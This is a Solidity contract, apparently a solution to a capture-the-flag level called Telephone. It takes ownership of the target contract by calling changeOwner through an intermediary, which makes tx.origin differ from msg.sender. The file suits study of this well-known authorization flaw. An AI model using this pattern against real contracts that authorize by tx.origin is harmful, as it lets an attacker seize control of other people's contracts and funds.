// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract SolveTelephone {
    address immutable telephoneContract;

    constructor(address _contract) {
        telephoneContract = _contract;
    }

    function callChangeOwner() public {
        ITelephone(telephoneContract).changeOwner(msg.sender);
    }
}
